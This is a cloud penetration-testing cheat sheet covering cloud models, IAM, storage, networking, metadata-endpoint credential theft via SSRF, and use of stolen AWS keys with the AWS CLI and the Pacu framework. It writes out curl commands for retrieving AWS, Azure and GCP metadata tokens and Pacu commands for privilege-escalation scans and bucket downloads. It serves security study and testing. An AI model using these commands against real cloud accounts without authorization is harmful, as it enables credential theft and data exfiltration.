

## 1. Cloud Models

|Model|Customer manages|
|---|---|
|**IaaS**|OS, applications, data, configuration|
|**PaaS**|Applications, data, access|
|**SaaS**|Data, identities, access settings|

**Shared responsibility:** Provider secures physical infrastructure; customer manages identities, data, and their cloud configuration.

## 2. IAM — Identity & Access Management

IAM policies define `Effect`, `Action`, and `Resource`.

```
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

**Danger:** Wildcards can grant excessive permissions.

Check for:

- Leaked access keys and secrets.
    
- Over-permissive policies.
    
- Roles the identity can assume.
    
- Access to sensitive storage and compute resources.
    

## 3. Cloud Storage

|Provider|Storage|
|---|---|
|AWS|S3 bucket|
|Azure|Blob container|
|GCP|Cloud Storage bucket|

**Common weaknesses:** Public buckets, wildcard principals (`"Principal": "*"`) , exposed backups, leaked signed URLs, and credentials in configuration files.

```
cloud_enum
s3scanner
```

Look for backups, `.env` files, source code, credentials, logs, and customer data.

**Remember:** Public listing, reading, and writing are different permissions.

## 4. Cloud Networking

- **VPC/VNet:** Private virtual network.
    
- **Subnet:** Network segment.
    
- **Security Group:** Stateful instance firewall in AWS.
    
- **Network ACL:** Stateless subnet-level filtering in AWS.
    

**Common exposed ports:** SSH `22`, RDP `3389`, MySQL `3306`, PostgreSQL `5432`, MongoDB `27017`, admin interfaces `8080`/`9000`.

```
nmap -sV -sC TARGET_IP
```

After gaining a foothold, check which internal databases, application servers, admin panels, and metadata endpoints the host can reach.

## 5. Instance Metadata Service (IMDS)

Metadata endpoints can expose instance information and temporary credentials for attached cloud identities.

|Provider|Endpoint|
|---|---|
|AWS|`http://169.254.169.254/latest/meta-data/`|
|Azure|`http://169.254.169.254/metadata/`|
|GCP|`http://metadata.google.internal/`|

### AWS Metadata

```
curl http://169.254.169.254/latest/meta-data/
```

Find the attached role:

```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**IMDSv1:** Plain GET requests.  
**IMDSv2:** Requires a session token obtained using PUT.

### Azure Metadata Token

```
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### GCP Metadata Token

```
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Azure and GCP metadata requests require their respective headers. A token is available only when the relevant identity and permissions are configured.

### SSRF Attack Chain

**SSRF → Metadata access → Temporary credentials/token → Identity enumeration → Cloud resource access.**

A vulnerable URL-fetching feature may let the server request internal metadata endpoints. Exploitability depends on application behavior and metadata configuration.

## 6. AWS CLI — Use Retrieved IMDS Credentials

After obtaining AWS temporary credentials:

```
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<Token>"
```

**Verify the identity**

```
aws sts get-caller-identity
```

**List accessible S3 buckets**

```
aws s3 ls
```

**Enumerate IAM permissions with** `**enumerate-iam.py**`

```
python3 enumerate-iam.py \
--access-key "$AWS_ACCESS_KEY_ID" \
--secret-key "$AWS_SECRET_ACCESS_KEY" \
--session-token "$AWS_SESSION_TOKEN"
```

**Important:** Temporary AWS credentials require the session token as well as the access key ID and secret key.

## 7. Pacu — AWS Exploitation Framework

**Pacu** is an AWS offensive security framework with modules for IAM enumeration, privilege-escalation analysis, and resource enumeration.

**Start Pacu**

```
pacu
```

**Add the retrieved credentials**

```
Pacu > set_keys
```

Follow the prompts to enter a key alias, access key ID, secret access key, and session token.

**Identify the current identity**

```
Pacu > whoami
```

**Enumerate permissions**

```
Pacu > run iam__enum_permissions
```

**Find potential IAM privilege-escalation paths**

```
Pacu > run iam__privesc_scan
```

**Enumerate and download accessible S3 bucket contents**

```
Pacu > run s3__download_bucket
```

The modules only work where the current credentials and permissions allow the relevant operations; findings are not guaranteed to be exploitable.

Reference: [Pacu — Official GitHub Repository](https://github.com/RhinoSecurityLabs/pacu)

## 8. Core Attack Chain

**Recon → Find exposed services/storage → Identify SSRF → Retrieve cloud credentials → Verify identity → Enumerate IAM permissions → Check privilege-escalation paths → Access available resources.**
